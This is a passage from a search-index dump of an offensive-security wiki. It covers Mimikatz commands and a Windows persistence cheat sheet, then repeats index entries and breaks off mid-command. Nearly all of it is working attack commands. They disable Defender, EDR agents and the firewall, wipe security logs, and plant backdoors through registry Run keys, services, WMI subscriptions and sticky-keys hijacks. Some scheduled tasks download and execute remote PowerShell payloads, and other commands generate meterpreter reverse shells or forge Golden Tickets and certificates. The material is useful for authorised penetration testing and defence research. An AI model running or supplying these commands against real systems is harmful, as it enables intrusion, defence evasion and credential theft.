debug rights (this or Local System rights is required for many Mimikatz commands). SEKURLSA::Ekeys list Kerberos encryption keys SEKURLSA::Kerberos List Kerberos credentials for all authenticated users (including services and computer account) SEKURLSA::Krbtgt get Domain Kerberos service account (KRBTGT)password data SEKURLSA::LogonPasswords lists all available provider credentials. This usually shows recently logged on user and computer credentials. SEKURLSA::Pth Pass- theHash and Over-Pass-the-Hash SEKURLSA::Tickets Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer\u2019s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users). TOKEN::List list all tokens of the system TOKEN::Elevate impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box TOKEN::Elevate /domainadmin impersonate a token with Domain Admin credentials.","title":"Mimikatz - Commands list"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#mimikatz-powershell-version","text":"Mimikatz in memory (no binary on disk) with : Invoke-Mimikatz from PowerShellEmpire Invoke-Mimikatz from PowerSploit More information can be grabbed from the Memory with : Invoke-Mimikittenz","title":"Mimikatz - Powershell version"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#references","text":"Unofficial Guide to Mimikatz & Command Reference Skeleton Key Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH","title":"References"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/","text":"Windows - Persistence Summary Tools Hide Your Binary Disable Antivirus and Security Antivirus Removal Disable Windows Defender Disable Windows Firewall Clear System and Security Logs Simple User Registry HKCU Startup Scheduled Tasks User BITS Jobs Serviceland IIS Windows Service Elevated Registry HKLM Winlogon Helper DLL GlobalFlag Startup Elevated Services Elevated Scheduled Tasks Elevated Binary Replacement Binary Replacement on Windows XP+ Binary Replacement on Windows 10+ RDP Backdoor utilman.exe sethc.exe Remote Desktop Services Shadowing Skeleton Key Virtual Machines Domain Golden Certificate Golden Ticket References Tools SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r Hide Your Binary Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file. PS> attrib +h mimikatz.exe Disable Antivirus and Security Antivirus Removal Sophos Removal Tool.ps1 Symantec CleanWipe Elastic EDR/Security ps1 cd \"C:\\Program Files\\Elastic\\Agent\\\" PS C:\\Program Files\\Elastic\\Agent> .\\elastic-agent.exe uninstall Elastic Agent will be uninstalled from your system at C:\\Program Files\\Elastic\\Agent. Do you want to continue? [Y/n]:Y Elastic Agent has been uninstalled. Cortex XDR ```ps1 # Global uninstall password: Password1 Password hash is located in C:\\ProgramData\\Cyvera\\LocalSystem\\Persistence\\agent_settings.db Look for PasswordHash, PasswordSalt or password, salt strings. Disable Cortex: Change the DLL to a random value, then REBOOT reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CryptSvc\\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f Disables the agent on startup (requires reboot to work) cytool.exe startup disable Disables protection on Cortex XDR files, processes, registry and services cytool.exe protect disable Disables Cortex XDR (Even with tamper protection enabled) cytool.exe runtime disable Disables event collection cytool.exe event_collection disable ``` Disable Windows Defender # Disable Defender sc config WinDefend start= disabled sc stop WinDefend Set-MpPreference -DisableRealtimeMonitoring $true ## Exclude a process / location Set-MpPreference -ExclusionProcess \"word.exe\", \"vmwp.exe\" Add-MpPreference -ExclusionProcess 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' Add-MpPreference -ExclusionPath C:\\Video, C:\\install # Disable scanning all downloaded files and attachments, disable AMSI (reactive) PS C:\\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus PS C:\\> Set-MpPreference -DisableIOAVProtection $true # Disable AMSI (set to 0 to enable) PS C:\\> Set-MpPreference -DisableScriptScanning 1 # Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f # Wipe currently stored definitions # Location of MpCmdRun.exe: C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\<antimalware platform version> MpCmdRun.exe -RemoveDefinitions -All # Remove signatures (if Internet connection is present, they will be downloaded again): PS > & \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" -RemoveDefinitions -All PS > & \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All # Disable Windows Defender Security Center reg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\" /t REG_DWORD /d \"4\" /f # Disable Real Time Protection reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f Disable Windows Firewall Netsh Advfirewall show allprofiles NetSh Advfirewall set allprofiles state off # ip whitelisting New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP Clear System and Security Logs cmd.exe /c wevtutil.exe cl System cmd.exe /c wevtutil.exe cl Security Simple User Set a file as hidden attrib +h c:\\autoexec.bat Registry HKCU Create a REG_SZ value in the Run key within HKCU\\Software\\Microsoft\\Windows. Value name: Backdoor Value data: C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe Using the command line reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\" reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\" reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\" reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\" Using SharPersist SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add -o env SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"logonscript\" -m add Startup Create a batch script in the user startup folder. PS C:\\> gc C:\\Users\\Rasta\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat start /b C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe Using SharPersist SharPersist -t startupfolder -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -f \"Some File\" -m add Scheduled Tasks User Using native schtask - Create a new task powershell # Create the scheduled tasks to run once at 00.00 schtasks /create /sc ONCE /st 00:00 /tn \"Device-Synchronize\" /tr C:\\Temp\\revshell.exe # Force run it now ! schtasks /run /tn \"Device-Synchronize\" Using native schtask - Leverage the schtasks /change command to modify existing scheduled tasks powershell # Launch an executable by calling the ShellExec_RunDLL function. SCHTASKS /Change /tn \"\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\" /TR \"C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\system32\\msiexec.exe /Z c:\\programdata\\S-1-5-18.dat\" /RL HIGHEST /RU \"\" /ENABLE Using Powershell powershell PS C:\\> $A = New-ScheduledTaskAction -Execute \"cmd.exe\" -Argument \"/c C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe\" PS C:\\> $T = New-ScheduledTaskTrigger -AtLogOn -User \"Rasta\" PS C:\\> $P = New-ScheduledTaskPrincipal \"Rasta\" PS C:\\> $S = New-ScheduledTaskSettingsSet PS C:\\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S PS C:\\> Register-ScheduledTask Backdoor -InputObject $D Using SharPersist ```powershell # Add to a current scheduled task SharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Something Cool\" -m add Add new task SharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add SharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add -o hourly ``` BITS Jobs bitsadmin /create backdoor bitsadmin /addfile backdoor \"http://10.10.10.10/evil.exe\" \"C:\\tmp\\evil.exe\" # v1 bitsadmin /SetNotifyCmdLine backdoor C:\\tmp\\evil.exe NUL bitsadmin /SetMinRetryDelay \"backdoor\" 60 bitsadmin /resume backdoor # v2 - exploit/multi/script/web_delivery bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe \"/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll\" bitsadmin /resume backdoor Serviceland IIS IIS Raid \u2013 Backdooring IIS Using Native Modules $ git clone https://github.com/0x09AL/IIS-Raid $ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS C:\\Windows\\system32\\inetsrv\\APPCMD.EXE install module /name:Module Name /image:\"%windir%\\System32\\inetsrv\\IIS-Backdoor.dll\" /add:true Windows Service Using SharPersist SharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m add Elevated Registry HKLM Similar to HKCU. Create a REG_SZ value in the Run key within HKLM\\Software\\Microsoft\\Windows. Value name: Backdoor Value data: C:\\Windows\\Temp\\backdoor.exe Using the command line reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\" reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\" reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\" reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\" Winlogon Helper DLL Run executable during Windows logon msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /d \"Userinit.exe, evilbinary.exe\" /f reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /d \"explorer.exe, evilbinary.exe\" /f Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, evilbinary.exe\" -Force Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, evilbinary.exe\" -Force GlobalFlag Run executable after notepad is killed reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512 reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1 reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\temp\\evil.exe\" Startup Elevated Create a batch script in the user startup folder. C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp Services Elevated Create a service that will start automatically or on-demand. # Powershell New-Service -Name \"Backdoor\" -BinaryPathName \"C:\\Windows\\Temp\\backdoor.exe\" -Description \"Nothing to see here.\" -StartupType Automatic sc start pentestlab # SharPersist SharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c backdoor.exe\" -n \"Backdoor\" -m add # sc sc create Backdoor binpath= \"cmd.exe /k C:\\temp\\backdoor.exe\" start=\"auto\" obj=\"LocalSystem\" sc start Backdoor Scheduled Tasks Elevated Scheduled Task to run as SYSTEM, everyday at 9am or on a specific day. Processes spawned as scheduled tasks have taskeng.exe process as their parent # Powershell $A = New-ScheduledTaskAction -Execute \"cmd.exe\" -Argument \"/c C:\\temp\\backdoor.exe\" $T = New-ScheduledTaskTrigger -Daily -At 9am # OR $T = New-ScheduledTaskTrigger -Daily -At \"9/30/2020 11:05:00 AM\" $P = New-ScheduledTaskPrincipal \"NT AUTHORITY\\SYSTEM\" -RunLevel Highest $S = New-ScheduledTaskSettingsSet $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S Register-ScheduledTask \"Backdoor\" -InputObject $D # Native schtasks schtasks /create /sc minute /mo 1 /tn \"eviltask\" /tr C:\\tools\\shell.cmd /ru \"SYSTEM\" schtasks /create /sc minute /mo 1 /tn \"eviltask\" /tr calc /ru \"SYSTEM\" /s dc-mantvydas /u user /p password schtasks /Create /RU \"NT AUTHORITY\\SYSTEM\" /tn [TaskName] /tr \"regsvr32.exe -s \\\"C:\\Users\\*\\AppData\\Local\\Temp\\[payload].dll\\\"\" /SC ONCE /Z /ST [Time] /ET [Time] ##(X86) - On User Login schtasks /create /tn OfficeUpdaterA /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onlogon /ru System ##(X86) - On System Start schtasks /create /tn OfficeUpdaterB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onstart /ru System ##(X86) - On User Idle (30mins) schtasks /create /tn OfficeUpdaterC /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onidle /i 30 ##(X64) - On User Login schtasks /create /tn OfficeUpdaterA /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onlogon /ru System ##(X64) - On System Start schtasks /create /tn OfficeUpdaterB /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onstart /ru System ##(X64) - On User Idle (30mins) schtasks /create /tn OfficeUpdaterC /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onidle /i 30 Windows Management Instrumentation Event Subscription An adversary can use Windows Management Instrumentation (WMI) to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. __EventFilter : Trigger (new process, failed logon etc.) EventConsumer : Perform Action (execute payload etc.) __FilterToConsumerBinding : Binds Filter and Consumer Classes # Using CMD : Execute a binary 60 seconds after Windows started wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"WMIPersist\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"WMIPersist\", ExecutablePath=\"C:\\Windows\\System32\\binary.exe\",CommandLineTemplate=\"C:\\Windows\\System32\\binary.exe\" wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"WMIPersist\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"WMIPersist\\\"\" # Remove it Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='WMIPersist'\" | Remove-WmiObject -Verbose # Using Powershell (deploy) $FilterArgs = @{name='WMIPersist'; EventNameSpace='root\\CimV2'; QueryLanguage=\"WQL\"; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 90\"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs $ConsumerArgs = @{name='WMIPersist'; CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\binary.exe\";} $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs $FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;} $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs # Using Powershell (remove) $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'WMIPersist'\" $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'WMIPersist'\" $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" $FilterConsumerBindingToCleanup | Remove-WmiObject $EventConsumerToCleanup | Remove-WmiObject $EventFilterToCleanup | Remove-WmiObject Binary Replacement Binary Replacement on Windows XP+ Feature Executable Sticky Keys C:\\Windows\\System32\\sethc.exe Accessibility Menu C:\\Windows\\System32\\utilman.exe On-Screen Keyboard C:\\Windows\\System32\\osk.exe Magnifier C:\\Windows\\System32\\Magnify.exe Narrator C:\\Windows\\System32\\Narrator.exe Display Switcher C:\\Windows\\System32\\DisplaySwitch.exe App Switcher C:\\Windows\\System32\\AtBroker.exe In Metasploit : use post/windows/manage/sticky_keys Binary Replacement on Windows 10+ Exploit a DLL hijacking vulnerability in the On-Screen Keyboard osk.exe executable. Create a malicious HID.dll in C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.dll . RDP Backdoor utilman.exe At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM. REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f sethc.exe Hit F5 a bunch of times when you are at the RDP login screen. REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f Remote Desktop Services Shadowing :warning: FreeRDP and rdesktop don't support Remote Desktop Services Shadowing feature. Requirements: * RDP must be running reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v Shadow /t REG_DWORD /d 4 # 4 \u2013 View Session without user\u2019s permission. # Allowing remote connections to this computer reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable UAC remote restriction reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt # /v parameter lets specify the {ADDRESS} value that is an IP address or a hostname of a remote host; # /shadow parameter is used to specify the {SESSION_ID} value that is a shadowee\u2019s session ID; # /noconsentprompt parameter allows to bypass a shadowee\u2019s permission and shadow their session without their consent; # /prompt parameter is used to specify a user\u2019s credentials to connect to a remote host. Skeleton Key # Exploitation Command runned as DA: Invoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName <DCs FQDN> # Access using the password \"mimikatz\" Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\\Administrator Virtual Machines Based on the Shadow Bunny technique. # download virtualbox Invoke-WebRequest \"https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe\" -OutFile $env:TEMP\\VirtualBox-6.1.8-137981-Win.exe # perform a silent install and avoid creating desktop and quick launch icons VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0 # in \\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe # Disabling notifications .\\VBoxManage.exe setextradata global GUI/SuppressMessages \"all\" # Download the Virtual machine disk Copy-Item \\\\smbserver\\images\\shadowbunny.vhd $env:USERPROFILE\\VirtualBox\\IT Recovery\\shadowbunny.vhd # Create a new VM $vmname = \"IT Recovery\" .\\VBoxManage.exe createvm --name $vmname --ostype \"Ubuntu\" --register # Add a network card in NAT mode .\\VBoxManage.exe modifyvm $vmname --ioapic on # required for 64bit .\\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128 .\\VBoxManage.exe modifyvm $vmname --nic1 nat .\\VBoxManage.exe modifyvm $vmname --audio none .\\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga .\\VBoxManage.exe modifyvm $vmname --description \"Shadowbunny\" # Mount the VHD file .\\VBoxManage.exe storagectl $vmname -name \"SATA Controller\" -add sata .\\VBoxManage.exe storageattach $vmname -comment \"Shadowbunny Disk\" -storagectl \"SATA Controller\" -type hdd -medium \"$env:USERPROFILE\\VirtualBox VMs\\IT Recovery\\shadowbunny.vhd\" -port 0 # Start the VM .\\VBoxManage.exe startvm $vmname \u2013type headless # optional - adding a shared folder # require: VirtualBox Guest Additions .\\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\\ -automount # then mount the folder in the VM sudo mkdir /mnt/c sudo mount -t vboxsf shadow_c /mnt/c Domain User Certificate # Request a certificate for the User template .\\Certify.exe request /ca:CA01.megacorp.local\\CA01 /template:User # Convert the certificate for Rubeus openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx # Request a TGT using the certificate .\\Rubeus.exe asktgt /user:username /certificate:C:\\Temp\\cert.pfx /password:Passw0rd123! Golden Certificate Require elevated privileges in the Active Directory, or on the ADCS machine Export CA as p12 file: certsrv.msc > Right Click > Back up CA... Alternative 1: Using Mimikatz you can extract the certificate as PFX/DER ps1 privilege::debug crypto::capi crypto::cng crypto::certificates /systemstore:local_machine /store:my /export Alternative 2: Using SharpDPAPI, then convert the certificate: openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx ForgeCert - Forge a certificate for any active domain user using the CA certificate ps1 ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123 ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123 Finally you can request a TGT using the Certificate ps1 Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123 Golden Ticket Forge a Golden ticket using Mimikatz kerberos::purge kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt kerberos::tgt References A view of persistence - Rastamouse Windows Persistence Commands - Pwn Wiki SharPersist Windows Persistence Toolkit in C - Brett Hawkins IIS Raid \u2013 Backdooring IIS Using Native Modules - 19/02/2020 Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - Apr 27, 2020 - @phraaaaaaa Persistence - Checklist - @netbiosX Persistence \u2013 Winlogon Helper DLL - @netbiosX Persistence - BITS Jobs - @netbiosX Persistence \u2013 Image File Execution Options Injection - @netbiosX Persistence \u2013 Registry Run Keys - @netbiosX Golden Certificate - NOVEMBER 15, 2021 Beware of the Shadowbunny - Using virtual machines to persist and evade detections - Sep 23, 2020 - wunderwuzzi Persistence \u2013 WMI Event Subscription - JANUARY 21, 2020 - pentestlab Persistence via WMI Event Subscription - Elastic Security Solution","title":"Windows - Persistence"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#windows-persistence","text":"","title":"Windows - Persistence"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#summary","text":"Tools Hide Your Binary Disable Antivirus and Security Antivirus Removal Disable Windows Defender Disable Windows Firewall Clear System and Security Logs Simple User Registry HKCU Startup Scheduled Tasks User BITS Jobs Serviceland IIS Windows Service Elevated Registry HKLM Winlogon Helper DLL GlobalFlag Startup Elevated Services Elevated Scheduled Tasks Elevated Binary Replacement Binary Replacement on Windows XP+ Binary Replacement on Windows 10+ RDP Backdoor utilman.exe sethc.exe Remote Desktop Services Shadowing Skeleton Key Virtual Machines Domain Golden Certificate Golden Ticket References","title":"Summary"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#tools","text":"SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r","title":"Tools"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#hide-your-binary","text":"Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file. PS> attrib +h mimikatz.exe","title":"Hide Your Binary"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#disable-antivirus-and-security","text":"","title":"Disable Antivirus and Security"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#antivirus-removal","text":"Sophos Removal Tool.ps1 Symantec CleanWipe Elastic EDR/Security ps1 cd \"C:\\Program Files\\Elastic\\Agent\\\" PS C:\\Program Files\\Elastic\\Agent> .\\elastic-agent.exe uninstall Elastic Agent will be uninstalled from your system at C:\\Program Files\\Elastic\\Agent. Do you want to continue? [Y/n]:Y Elastic Agent has been uninstalled. Cortex XDR ```ps1 # Global uninstall password: Password1 Password hash is located in C:\\ProgramData\\Cyvera\\LocalSystem\\Persistence\\agent_settings.db Look for PasswordHash, PasswordSalt or password, salt strings.","title":"Antivirus Removal"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#disable-cortex-change-the-dll-to-a-random-value-then-reboot","text":"reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CryptSvc\\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f","title":"Disable Cortex: Change the DLL to a random value, then REBOOT"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#disables-the-agent-on-startup-requires-reboot-to-work","text":"cytool.exe startup disable","title":"Disables the agent on startup (requires reboot to work)"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#disables-protection-on-cortex-xdr-files-processes-registry-and-services","text":"cytool.exe protect disable","title":"Disables protection on Cortex XDR files, processes, registry and services"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#disables-cortex-xdr-even-with-tamper-protection-enabled","text":"cytool.exe runtime disable","title":"Disables Cortex XDR (Even with tamper protection enabled)"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#disables-event-collection","text":"cytool.exe event_collection disable ```","title":"Disables event collection"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#disable-windows-defender","text":"# Disable Defender sc config WinDefend start= disabled sc stop WinDefend Set-MpPreference -DisableRealtimeMonitoring $true ## Exclude a process / location Set-MpPreference -ExclusionProcess \"word.exe\", \"vmwp.exe\" Add-MpPreference -ExclusionProcess 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' Add-MpPreference -ExclusionPath C:\\Video, C:\\install # Disable scanning all downloaded files and attachments, disable AMSI (reactive) PS C:\\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus PS C:\\> Set-MpPreference -DisableIOAVProtection $true # Disable AMSI (set to 0 to enable) PS C:\\> Set-MpPreference -DisableScriptScanning 1 # Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f # Wipe currently stored definitions # Location of MpCmdRun.exe: C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\<antimalware platform version> MpCmdRun.exe 